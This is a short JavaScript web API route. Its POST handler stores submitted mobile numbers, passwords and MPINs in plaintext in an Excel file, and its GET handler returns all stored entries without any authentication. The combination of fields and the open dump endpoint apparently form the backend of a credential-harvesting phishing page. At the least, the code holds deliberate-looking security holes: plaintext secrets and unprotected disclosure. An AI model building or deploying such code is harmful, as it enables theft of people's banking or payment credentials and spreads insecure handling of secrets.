import * as XLSX from "xlsx";
import { writeFileSync, existsSync, readFileSync } from "fs";

export async function POST(req) {
  try {
    const body = await req.json();
    const { mobile, password, mpin } = body;

    const filePath = "data.xlsx"; 
    let data = [];

    if (existsSync(filePath)) {
      const file = readFileSync(filePath);
      const workbook = XLSX.read(file, { type: "buffer" });
      const worksheet = workbook.Sheets[workbook.SheetNames[0]];
      data = XLSX.utils.sheet_to_json(worksheet);
    }

    data.push({
      Mobile: mobile,
      Password: password,
      Mpin: mpin,
      Date: new Date().toLocaleString(),
    });

    const worksheet = XLSX.utils.json_to_sheet(data);
    const workbook = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(workbook, worksheet, "Sheet1");

    writeFileSync(filePath, XLSX.write(workbook, { type: "buffer", bookType: "xlsx" }));

    return Response.json({ success: true, message: "Data saved to Excel!" });
  } catch (err) {
    return Response.json({ success: false, error: err.message }, { status: 500 });
  }
}

// 🔹 New GET method
export async function GET() {
  try {
    const filePath = "data.xlsx";

    if (!existsSync(filePath)) {
      return Response.json({ success: true, data: [] });
    }

    const file = readFileSync(filePath);
    const workbook = XLSX.read(file, { type: "buffer" });
    const worksheet = workbook.Sheets[workbook.SheetNames[0]];
    const data = XLSX.utils.sheet_to_json(worksheet);

    return Response.json({ success: true, data });
  } catch (err) {
    return Response.json({ success: false, error: err.message }, { status: 500 });
  }
}
